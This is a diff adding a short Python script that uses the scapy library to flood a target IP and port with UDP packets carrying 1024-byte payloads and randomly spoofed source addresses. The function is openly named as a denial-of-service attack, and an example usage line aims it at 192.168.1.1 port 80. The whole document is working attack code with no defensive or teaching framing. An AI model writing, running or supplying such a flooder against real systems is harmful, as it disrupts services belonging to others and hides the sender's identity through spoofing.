@@ -1,0 +1,15 @@
+from scapy.all import *
+import random
+import time
+
+def dos_attack(target_ip, target_port, count=100):
+    print("Starting DoS attack...")
+    for _ in range(count):
+        ip = IP(src="192.168.1." + str(random.randint(2, 254)), dst=target_ip)
+        udp = UDP(sport=random.randint(1024, 65535), dport=target_port)
+        packet = ip / udp / Raw(load="X" * 1024)  # Sending large payloads
+        send(packet, verbose=False)
+        time.sleep(0.1)
+    print("DoS attack completed.")
+
+# Example Usage: dos_attack("192.168.1.1", 80, 100)
